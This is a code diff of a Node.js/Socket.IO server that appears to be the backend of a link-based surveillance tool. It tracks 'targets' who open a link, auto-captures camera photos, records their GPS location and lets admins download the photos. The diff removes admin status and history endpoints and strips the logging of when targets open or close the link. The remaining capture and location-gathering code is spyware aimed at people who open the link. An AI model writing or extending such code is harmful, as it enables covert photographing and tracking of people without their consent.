@@ -12,7 +12,7 @@ const server = http.createServer(app);
 app.set("trust proxy", 1);
 
 const io = new Server(server, {
-    maxHttpBufferSize: 10 * 1024 * 1024, // Increased buffer size for HD images
+    maxHttpBufferSize: 10 * 1024 * 1024,
     pingTimeout: 20000,
     pingInterval: 25000
 });
@@ -153,38 +153,6 @@ app.get("/api/admin/status", (req, res) => {
     res.json({ ok: true, authenticated: isAdminRequest(req) });
 });
 
-app.get("/api/admin/state", requireAdmin, (req, res) => {
-    res.json({
-        ok: true,
-        linkActive: isLinkActive,
-        autoCapture: isAutoCaptureOn,
-        maxUsers: MAX_USERS,
-        activeUsers: connectedTargets.size,
-        tempPhotos: tempPhotos.size
-    });
-});
-
-app.get("/api/admin/history", requireAdmin, (req, res) => {
-    res.json({ ok: true, history: accessHistory.slice().reverse() });
-});
-
-app.post("/api/admin/link", requireAdmin, (req, res) => {
-    isLinkActive = Boolean(req.body.active);
-    if (!isLinkActive) io.to("users").emit("disable-user-access");
-    io.to("admins").emit("link-status", isLinkActive);
-    res.json({ ok: true, active: isLinkActive });
-});
-
-app.post("/api/admin/auto-capture", requireAdmin, (req, res) => {
-    isAutoCaptureOn = Boolean(req.body.enabled);
-    io.to("admins").emit("auto-capture-status", isAutoCaptureOn);
-    res.json({ ok: true, enabled: isAutoCaptureOn });
-});
-
-app.get("/api/admin/photos", requireAdmin, (req, res) => {
-    res.json({ ok: true, photos: Array.from(tempPhotos.values()) });
-});
-
 app.get("/api/admin/photos/:id/download", requireAdmin, (req, res) => {
     const photo = tempPhotos.get(req.params.id);
     if (!photo) return res.status(404).send("Photo not found.");
@@ -255,10 +223,7 @@ io.on("connection", (socket) => {
             };
             connectedTargets.set(socket.id, target);
             socket.join("users");
-            const timeStr = new Date().toISOString();
-            addHistory({ event: "link-opened", socketId: socket.id, deviceInfo: target.deviceInfo, time: timeStr });
             emitUsersList();
-            io.to("admins").emit("access-event", { event: "link-opened", socketId: socket.id, deviceInfo: target.deviceInfo, time: timeStr });
         }
     });
 
@@ -281,9 +246,6 @@ io.on("connection", (socket) => {
             };
             connectedTargets.set(socket.id, target);
             socket.join("users");
-            const timeStr = new Date().toISOString();
-            addHistory({ event: "link-opened", socketId: socket.id, deviceInfo: target.deviceInfo, time: timeStr });
-            io.to("admins").emit("access-event", { event: "link-opened", socketId: socket.id, deviceInfo: target.deviceInfo, time: timeStr });
         }
         target.cameraReady = true;
         if (isAutoCaptureOn && !target.autoCaptureStarted) {
@@ -293,7 +255,6 @@ io.on("connection", (socket) => {
         emitUsersList();
     });
 
-    // Real-time GPS location save handler
     socket.on("user-location", (locData) => {
         const target = connectedTargets.get(socket.id);
         if (!target || !locData || typeof locData.latitude !== "number" || typeof locData.longitude !== "number") return;
@@ -330,9 +291,6 @@ io.on("connection", (socket) => {
         authenticatedAdmins.delete(socket.id);
         const target = connectedTargets.get(socket.id);
         if (target) {
-            const timeStr = new Date().toISOString();
-            addHistory({ event: "link-closed", socketId: socket.id, deviceInfo: target.deviceInfo, time: timeStr });
-            io.to("admins").emit("access-event", { event: "link-closed", socketId: socket.id, deviceInfo: target.deviceInfo, time: timeStr });
             connectedTargets.delete(socket.id);
             emitUsersList();
         }
